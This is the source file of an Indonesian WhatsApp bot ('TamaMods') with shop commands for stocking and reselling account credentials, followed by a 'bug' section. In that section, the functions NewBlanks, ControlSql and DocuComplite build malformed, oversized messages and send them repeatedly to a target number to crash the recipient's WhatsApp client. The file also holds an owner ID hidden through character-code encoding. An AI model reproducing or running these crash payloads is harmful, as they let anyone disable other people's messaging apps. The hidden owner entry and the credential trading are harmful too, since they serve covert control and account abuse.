/*

const { default :
Type Case,
Simple Base
} = require("@BaseBotJavascript/TamaMods")
const Contact TamaMods = {
 ▢ Telegram : "@TamaModss", "t.me/TamaModss",
 ▢ WhatsApp : "000", 
 ▢ Youtube : "@ZephrineMods", 
 ▢ Tiktok : "@tamaofficial1"
}, { NOTE : Dont Delete Credit Guys }

*/
require('../Control/Ctrl');
const fs = require('fs');
const pendapatanList = JSON.parse(fs.readFileSync("./System/pendapatan.json", "utf-8") || "[]");
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const { tiktokdl } = require('tiktokdl')
const { Downloader } = require("@tobyg74/tiktok-api-dl")
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper");
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const os = require('os');
const JsConfuser = require('js-confuser');
const { say } = require("cfonts")
const similarity = require('similarity');
const anon = require('../Access/menfess')
const datek = new Date((new Date).toLocaleString("en-US", {timeZone: "Asia/Jakarta"}))
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
const pino = require('pino');
const { Client } = require('ssh2');
const { addSaldo, tambahSaldo, cekSaldo, kurangiSaldo } = require('../Access/cekdatasaldo');
let domains = JSON.parse(fs.readFileSync("./System/data/domain.json"))
const ImgSql = fs.existsSync("../System/media/SqlEnception.jpg");
const Xml = fs.existsSync("../System/media/SqlEnception.jpg");
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, downloadMediaMessage, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require(global.baileys);
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 Januari 2025").getTime()
let weton = ["Pahing", "Pon","Wage","Kliwon","Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", { weekday: "long" })
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
const jam = moment().tz('Asia/Jakarta').locale('id').format('HH:mm:ss');
const { LoadDataBase } = require('../System/message');
const contacts = JSON.parse(fs.readFileSync("./Access/database/contacts.json"))
const serverpanel = JSON.parse(fs.readFileSync("./System/settingpanel.json"))
const stokdo = JSON.parse(fs.readFileSync("./Access/database/stokdo.json"))
const listidch = JSON.parse(fs.readFileSync("./Access/database/listidch.json"))
const owners = JSON.parse(fs.readFileSync("./Access/database/owner.json"))
const kontributor = JSON.parse(fs.readFileSync("./Access/database/own.json"))
const premium = JSON.parse(fs.readFileSync("./Access/database/premium.json"))
const seller = JSON.parse(fs.readFileSync("./Access/database/reseller.json"))
const sellerr = JSON.parse(fs.readFileSync("./Access/database/resellerr.json"))
const list = JSON.parse(fs.readFileSync("./Access/database/list.json"))
const setbot = JSON.parse(fs.readFileSync("./System/data/bot.json"))
const BadNano = JSON.parse(fs.readFileSync('./System/bad.json'))
const { pinterest, pinterest2, Buddy, remini, mediafire, tiktokDl } = require('../Access/scraper');
const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('../Access/function');

module.exports = TamaMods = async (TamaMods, m, chatUpdate, store) => {
	try {
await LoadDataBase(TamaMods, m)
const botNumber = await TamaMods.decodeJid(TamaMods.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓/_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const prefiks = ""
const isCmd = body.startsWith(prefix)
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isSeller = seller.includes(m.sender)
const isSellerr = sellerr.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const qtext = q = args.join(" ")
const text = q = args.join(' ')
const from = m.key.remoteJid
const isGroup = m.chat.endsWith('@g.us')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const pushname = m.pushName || "No Name"
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
    
   const { fromMe } = m
   
   let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? TamaMods.user.id : m.sender
const deviceinfo = /^3A/.test(m.id) ? '𝖨𝗈𝗌' : m.id.startsWith('3EB') ? '𝖶𝖾𝖻' : /^.{21}/.test(m.id) ? '𝖠𝗇𝖽𝗋𝗈𝗂𝖽' : /^.{18}/.test(m.id) ? '𝖣𝖾𝗄𝗌𝗍𝗈𝗉' : '𝖴𝗇𝗄𝗇𝗈𝗐𝗇';
//============== [ MESSAGE ] ================================================
try {
m.isGroup = m.chat.endsWith("g.us");
m.metadata = m.isGroup ? await TamaMods.groupMetadata(m.chat).catch(_ => {}) : {};
const participants = m.metadata?.participants || [];
m.isAdmin = Boolean(participants.find(p => p.admin !== null && p.jid === m.sender));
m.isBotAdmin = Boolean(participants.find(p => p.admin !== null && p.jid === botNumber));
} catch (error) {
console.error("Error metadata:", error);
m.metadata = {};
m.isAdmin = false;
m.isBotAdmin = false;
}

const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "Selamat Malam 🌃"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "Selamat Sore 🌅"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "Selamat Siang 🏞️"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "Selamat Pagi 🏙️"
} else {
    ucapanWaktu = "Subuh 🌄"
};

const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

let jakartaTime = moment().tz("Asia/Jakarta"),
    jammenit = jakartaTime.format("HH:mm");


if (isCmd) {
    console.log(`
${chalk.inverse(' 🐥 COMMAND RECEIVED ')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Type:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭───────────────────────────────────────╮')}
${chalk.greenBright.bold('│        Simple Bot V2 Generasi 2           │')}
${chalk.greenBright.bold('╰───────────────────────────────────────╯')}
    `);
}

//============= [ FAKEQUOTED ] ===============================================
const getWaktuWITA = () => {

    return moment().tz("Asia/Makassar").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWITA = getWaktuWITA();

const getWaktuWIT = () => {

    return moment().tz("Asia/Jayapura").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIT = getWaktuWIT();        
const getWaktuWIB = () => {

    return moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");

};

const waktuWIB = getWaktuWIB();

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
const db_sider = JSON.parse(fs.readFileSync("./System/sider.json"));

const GcSiderUpdate=(i,s)=>{if(db_sider[s]){const e=db_sider[s].findIndex((s=>s.user_id===i));-1!==e?db_sider[s][e].timestamp=timestamp:db_sider[s].push({user_id:i,tanggal:tgl_hariini,timestamp:timestamp}),fs.writeFileSync("./System/sider.json",JSON.stringify(db_sider))}else db_sider[s]=[{user_id:i,tanggal:tgl_hariini,timestamp:timestamp}],fs.writeFileSync("./System/sider.json",JSON.stringify(db_sider))};

const content=JSON.stringify(m.message),wib=moment.tz("Asia/Jakarta").format("HH : mm : ss"),wit=moment.tz("Asia/Jayapura").format("HH : mm : ss"),wita=moment.tz("Asia/Makassar").format("HH : mm : ss"),time2=moment().tz("Asia/Jakarta").format("HH:mm:ss"),timestamp=moment().tz("Asia/Jakarta").valueOf(),hariini=jakartaTime.format("DD MMMM YYYY"),tgl_hariini=moment().tz("Asia/Jakarta").format("DD-MM-YYYY");


//============= [ EVENT GROUP ] ==============================================
const pantek = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: ImgSql,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝐔𝐬𝐞𝐫 : ${m.pushName}\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const Reply = (teks) => {
TamaMods.sendMessage(m.chat, {    
    interactiveMessage: {    
        title: teks,      
        footer: `${footer}`,      
        image: { url: "https://files.catbox.moe/wbl5er.jpg" },      
        nativeFlowMessage: {        
            messageParamsJson: JSON.stringify({          
                limited_time_offer: {            
                    text: "SimpleBotV3",            
                    url: "https://t.me/TamaModss",            
                    copy_code: "Gen 2",            
                    expiration_time: Date.now() * 999          
                },          
                bottom_sheet: {            
                    in_thread_buttons_limit: 2,            
                    divider_indices: [1, 2, 3, 4, 5, 999],            
                    list_title: "$",            
                    button_title: "X"          
                },          
                tap_target_configuration: {            
                    title: " X ",            
                    description: "bomboclard",            
                    canonical_url: "https://t.me/TamaModss",            
                    domain: "shop.example.com",            
                    button_index: 0          
                }        
            }),        
            buttons: [          
                {            
                    name: "single_select",            
                    buttonParamsJson: JSON.stringify({              
                        has_multiple_buttons: true            
                    })          
                },          
                {            
                    name: "call_permission_request",            
                    buttonParamsJson: JSON.stringify({              
                        has_multiple_buttons: true            
                    })          
                },          
                {            
                    name: "single_select",            
                    buttonParamsJson: JSON.stringify({              
                        title: "X",              
                        sections: [                
                            {                  
                                title: "A - $ T4m4",                  
                                highlight_label: "label",                  
                                rows: [                    
                                    {                      
                                        title: "Back",                      
                                        description: "X",                      
                                        id: "menu"                    
                                    }                  
                                ]                
                            }              
                        ],              
                        has_multiple_buttons: true            
                    })          
                },          
                {            
                    name: "cta_copy",            
                    buttonParamsJson: JSON.stringify({              
                        display_text: "TamaFnX",              
                        id: "123456789",              
                        copy_code: "TAMA1234"            
                    })          
                }        
            ]      
        }    
    }  
}, { quoted: pantek });
}
async function doneress () {
if (!q) throw "Done Response"
let target = q.replace(/[^0-9]/g, "")
let Response = `
⌜ Simple Bot ☇ Bug° Status ⌟
⬡ Author: TamaModss
⬡ Version: 1.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Case - Plugins )

─▢ Target: ${target}
─▢ Status: Process
─▢ Type: ${command}
`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: Response,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "https://t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek })
}
async function DoneBugs () {
if (!q) throw "Done Response"
let target = q.replace(/[^0-9]/g, "")
let Response = `
⌜ Simple Bot ☇ Bug° Status ⌟
⬡ Author: TamaModss
⬡ Version: 1.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Case - Plugins )

─▢ Target: ${target}
─▢ Status: Done
─▢ Type: ${command}
`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: Response,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "https://t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek })
}
const {
	xvideosSearch,
	xvideosdl,
	xnxxdl,
	xnxxSearch
} = require('../Access/scraper3.js')


//-# Funcation Addstock -#//
function addStock(idProduk, accountDetails) {
const jsonFileName = `System/data/${idProduk}.json`;

try {
if (!idProduk || !accountDetails) {
return Reply("`[ Contoh ]` .addstock code <email>:<password>:<profil>:<pin>:<2FA>");
}
const detailParts = accountDetails.split(':');
if (detailParts.length !== 5) {
return Reply('*[ System Notice ]* Format akun salah! Gunakan: allibot@gmail.com:Fahri@ali:Bebas:Bebasjikaada:Code a2f');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
stokData = [];
}
const newEntry = accountDetails;
stokData.push(newEntry);
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('System/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
return Reply('Gagal membaca daftar produk.');
}

const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
Reply(`✅️ Stok berhasil ditambahkan!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Jumlah Stok Baru* : ${stokData.length}
*[-] Jangan Lupa Beli Stock Kami [-]*`);

} catch (err) {
console.error('Error in addStock:', err);
Reply('Terjadi kesalahan saat menambahkan stok.');
}
}
// -# Funcation Addtutor link -# //
function addTutorLink(code, link) {
const jsonFileName = `System/tutor/${code}.json`;

try {
if (!code || !link) {
return Reply("[ Contoh ] .addtutorlink code|link\n[ Valid Code ] .addtutorlink tut101|https://example.com/tutorial");
}
let tutorLinks = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
tutorLinks = JSON.parse(fileContent);
} catch (readErr) {
console.error('Error reading tutor links file:', readErr);
tutorLinks = [];
}
const newEntry = { code, link };
tutorLinks.push(newEntry);

fs.writeFileSync(jsonFileName, JSON.stringify(tutorLinks, null, 4), 'utf8');
Reply(`✅️ Tutor link berhasil ditambahkan!\n` +
`*-# Kode* : ${code}\n` +
`*-# Link* : ${link}\n` +
`*[-] Terima kasih telah menggunakan bot ini [-]*`);
} catch (err) {
console.error('Error in addTutorLink:', err);
Reply('Terjadi kesalahan saat menambahkan tutor link.');
}
}
// -# Funcation Save Transaksi #- //
function saveTransactionHistory(sender, serverId, totalAmount) {
try {
if (!db.transactions) {
db.transactions = {};
}
const transactionId = `${sender}_${serverId}_${Date.now()}`;
db.transactions[transactionId] = {
sender: sender,
serverId: serverId,
amount: totalAmount,
timestamp: new Date().toISOString(),
status: 'completed'
};
const maxTransactions = 100;
const transactionKeys = Object.keys(db.transactions);
if (transactionKeys.length > maxTransactions) {
transactionKeys.slice(0, transactionKeys.length - maxTransactions)
.forEach(key => delete db.transactions[key]);
}
} catch (error) {
console.error('Error saving transaction history:', error);
TamaMods.sendMessage(m.chat, {
text: 'Gagal menyimpan riwayat transaksi.'
}, { quoted: pantek });
}
}
//-# Funcation Edit Stock #-//
function editStock(idProduk, oldAccountDetails, newAccountDetails) {
const jsonFileName = `System/data/${idProduk}.json`;

try {
if (!idProduk || !oldAccountDetails || !newAccountDetails) {
return Reply("`[ Contoh ]` .editstock code <lama email>:<lama password> <baru email>:<baru password>:<baru profil>:<baru pin>:<baru 2FA>");
}
const oldDetailParts = oldAccountDetails.split(':');
const newDetailParts = newAccountDetails.split(':');

if (oldDetailParts.length < 2 || newDetailParts.length !== 5) {
return Reply('*[ System Notice ]* Format akun salah! Gunakan contoh: email:password email:password:profil:pin:2FA');
}
let stokData = [];
try {
const fileContent = fs.readFileSync(jsonFileName, 'utf8');
try {
stokData = JSON.parse(fileContent);
} catch {
stokData = fileContent.trim().split('\n').filter(line => line.trim() !== '');
}
} catch (readErr) {
console.error('Error reading stock file:', readErr);
return Reply('Tidak dapat membaca file stok.');
}
const oldEntryIndex = stokData.findIndex(entry => entry === oldAccountDetails);
if (oldEntryIndex === -1) {
return Reply('*[ System Notice ]* Akun yang ingin diubah tidak ditemukan.');
}
stokData[oldEntryIndex] = newAccountDetails;
fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
let produkList = [];
try {
const data = fs.readFileSync('System/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error reading product list:', err);
}
const produk = produkList.find(p => p.id === idProduk);
const produkNama = produk ? produk.nama : idProduk;
Reply(`✅️ Stok berhasil diperbarui!\n` +
`*-# Produk* : ${produkNama}\n` +
`*-# Kode Produk* : ${idProduk}\n` +
`*-# Total Stok* : ${stokData.length}\n` +
`*[-] Stok telah diperbarui dengan detail baru [-]*`);

} catch (err) {
console.error('Error in editStock:', err);
Reply('Terjadi kesalahan saat mengubah stok.');
}
}
//-# Funcation Edit Produk #-//
function editProduk(kode, updateData) {
try {
let produkList = [];
try {
const data = fs.readFileSync('System/data/produk.json', 'utf8');
produkList = JSON.parse(data) || [];
} catch (err) {
console.error(err);
return Reply('Terjadi kesalahan saat membaca data produk.');
}
const productIndex = produkList.findIndex(p => p.id === kode);
if (productIndex === -1) {
return Reply(`Produk dengan kode ${kode} tidak ditemukan.`);
}
const existingProduct = produkList[productIndex];
const updatedProduk = {
id: kode,
nama: updateData.nama || existingProduct.nama,
harga: updateData.harga !== undefined ? parseInt(updateData.harga) : existingProduct.harga,
deskripsi: updateData.deskripsi || existingProduct.deskripsi,
snk: updateData.snk || existingProduct.snk || 'Syarat dan Ketentuan Berlaku',
terjual: existingProduct.terjual
};
if (!updatedProduk.nama || isNaN(updatedProduk.harga) || !updatedProduk.deskripsi) {
return Reply('Data produk tidak valid. Pastikan nama, harga, dan deskripsi terisi dengan benar.');
}
produkList[productIndex] = updatedProduk;
try {
fs.writeFileSync('System/data/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
const updateMessage = `✅️Produk berhasil diperbarui:\n` +
`*-# Kode* : ${kode}\n` +
`*-# Nama* : ${updatedProduk.nama}\n` +
`*-# Harga* : ${updatedProduk.harga}\n` +
`*-# Deskripsi* : ${updatedProduk.deskripsi}`;

Reply(updateMessage);
} catch (err) {
console.error(err);
Reply('Gagal memperbarui produk. Terjadi kesalahan.');
}
} catch (err) {
console.error('Error in editProduk:', err);
Reply('Terjadi kesalahan saat mengubah produk.');
}
}
//-# Funcation Del Produk -#//
function delProduk(kode, m) {
try {
const produkFilePath = 'System/data/produk.json';
const stockFilePath = `System/data/${kode}.json`;
let produkList = [];
try {
const data = fs.readFileSync(produkFilePath, 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error('Error membaca file produk:', err);
return Reply('*[ System Notice ]* Terjadi kesalahan saat membaca data produk.');
}
const produkIndex = produkList.findIndex(p => p.id === kode);
if (produkIndex === -1) {
return Reply(`*[ System Notice ]* Produk dengan kode ${kode} tidak ditemukan.`);
}
const produkDihapus = produkList[produkIndex];
produkList.splice(produkIndex, 1);

try {
fs.writeFileSync(
produkFilePath, 
JSON.stringify(produkList, null, 4), 
'utf8'
);
if (fs.existsSync(stockFilePath)) {
fs.unlinkSync(stockFilePath);
}
const responseMessage = 
`🗑️ Produk Berhasil Dihapus
*-# Kode Produk: ${kode}*
*-# Nama Produk: ${produkDihapus.nama}*
*-# Harga: Rp ${produkDihapus.harga.toLocaleString()}*
*-# Waktu Dihapus: ${new Date().toLocaleString()}*
*[-] ✔️ Produk Telah Dihapus Dari Sistem [-]*`;

Reply(responseMessage);
} catch (err) {
console.error('Error menulis/menghapus file:', err);
Reply('Gagal menghapus produk. Terjadi kesalahan saat menyimpan.');
}
} catch (err) {
console.error('Error dalam fungsi delProduk:', err);
Reply('Terjadi kesalahan umum saat menghapus produk.');
}
}
//-----(Awalan Function Bug)-----//
async function NewBlanks(target) {
  const btn1 = JSON.stringify({
    display_text: "ok",
    url: "\0" + "A".repeat(8190), // 8 kB → parser mati
    merchant_url: ""
  });
  const fakeDoc = await prepareWAMessageMedia({
    document: { url: "data:application/pdf;base64," }, // id palsu
    mimetype: "application/pdf",
    fileName: "\0".repeat(5000) + ".pdf"
  }, { upload: TamaMods.waUploadToServer, mediaType: "document" });
  const btn2 = JSON.stringify({
    display_text: "open",
    url: "https://Wa.me/stickerpack/TamaModss-Settings"
  });
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...fakeDoc,
        hasMediaAttachment: true
      },
      body: { text: "audit" },
      footer: { text: "" },
      nativeFlowMessage: {
        buttons: [
          { name: "cta_url", buttonParamsJson: btn1 },
          { name: "cta_url", buttonParamsJson: btn2 }
        ]
      }
    }
  }), { quoted: null });

  await TamaMods.relayMessage(target, msg.message, { messageId: msg.key.id });
  console.log("1 msg 2-crash terkirim");
}
async function ControlSql(target, mention) {
        const msg = await generateWAMessageFromContent(
                target,
                {
                        viewOnceMessage: {
                                message: {
                                        interactiveResponseMessage: {
                                                body: {
                                                        text: " #RizxvelzExec1St ",
                                                        format: "DEFAULT",
                                                },
                                                nativeFlowResponseMessage: {
                                                        name: "call_permission_request",
                                                        paramsJson: " \u0009 ".repeat(1000000),
                                                        version: 3,
                                                },
                                        },
                                },
                        },
                },
                {}
        )

        await TamaMods.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                        {
                                tag: "meta",
                                attrs: {},
                                content: [
                                        {
                                                tag: "mentioned_users",
                                                attrs: {},
                                                content: [
                                                        {
                                                                tag: "to",
                                                                attrs: { jid: target },
                                                                content: undefined,
                                                        },
                                                ],
                                        },
                                ],
                        },
                ],
        })
        if (mention) { 
                await TamaMods.relayMessage(
                        target,
                        {
                                groupStatusMentionMessage: {
                                        message: {
                                                protocolMessage: {
                                                        key: msg.key,
                                                        type: 25,
                                                },
                                        },
                                },
                        },
                        {
                                additionalNodes: [
                                        {
                                                tag: "meta",
                                                attrs: {
                                                        is_status_mention: "false",
                                                },
                                                content: undefined,
                                        },
                                ],
                        }
                )
        }
        console.log(chalk.green("Success Send Bug By TamaModss🐉"))
        await new Promise(resolve => setTimeout(resolve, 9500));
}
async function DocuComplite(target) {
const UiLoad = "ꦽ".repeat(5000) + 
                "ꦽ".repeat(5000) + 
                "𑜦𑜠".repeat(1800) +
                 "ི꒦ྀ".repeat(1800) + 
                 "ꦾ".repeat(1800);
  let msg = {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "TamaModss" + UiLoad,
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/10000000_796692563089708_355304506673586600_n.enc?ccb=11-4&oh=01_Q5Aa2wENjvJefhEXovRFLFpYTWBClRbPMDy2Gu91XoGc5YkakA&oe=69141396&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.android.package-archive",
            fileSha256: "eMRrcup+JPA9i9oCmQJ76AOj0a46preT/pSdBnHEBDs=",
            fileLength: "99999999",
            pageCount: 0,
            mediaKey: "sQ5l4N5KwP+MQo63wtPvy2zQaJKooS3OfomRuPa3u8g=",
            fileName: "Simple Bot V2 Gen 2.zip" + "\u0000".repeat(18000) + UiLoad,
            fileEncSha256: "qtMbOk3R+lz1BFAoL32bTGlJDlHAF96ADMOEcbANI3Q=",
            directPath: "/v/t62.7119-24/10000000_796692563089708_355304506673586600_n.enc?ccb=11-4&oh=01_Q5Aa2wENjvJefhEXovRFLFpYTWBClRbPMDy2Gu91XoGc5YkakA&oe=69141396&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1760343932"
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
              )
            ],
            forwardingScore: 999,
            isForwarded: true
          },
          caption: "Tama || Mods" + UiLoad,
          contentText: "Tama || Mods‌" + UiLoad,
          footerText: "Tama || Mods",
          interactiveMessage: {
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(5000),
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u0000".repeat(10000),
                    flow_cta: "haay",
                    flow_message_version: "3"
                  })
                }
              ]
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    await TamaMods.relayMessage(target, msg, { 
    messageId: null 
    });
    await sleep(1000)
  }
}
